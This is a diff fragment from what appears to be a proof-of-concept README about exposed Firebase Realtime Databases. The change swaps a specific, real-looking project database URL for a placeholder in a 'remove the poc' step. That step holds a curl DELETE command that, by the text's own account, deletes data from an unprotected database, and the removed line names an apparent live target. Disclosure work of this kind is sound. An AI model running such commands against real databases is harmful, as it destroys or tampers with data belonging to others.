@@ -56,7 +56,7 @@ If the request is successful and data is written and return {"name":"-OKELb6Zxxx
 ## ✍️ Step 3+: How remove the poc For Blackhats 🎩
 
 ```bash
-curl -X DELETE https://pm-kisan-gullu-1823-14-1-25-default-rtdb.firebaseio.com/-OKELb6ZxxxxDEiDm7W.json
+curl -X DELETE https://<subdomain>.firebaseio.com/-OKELb6ZxxxxDEiDm7W.json
 ```
 
 If the request is successful and response is "null" , the Firebase database is deleted.
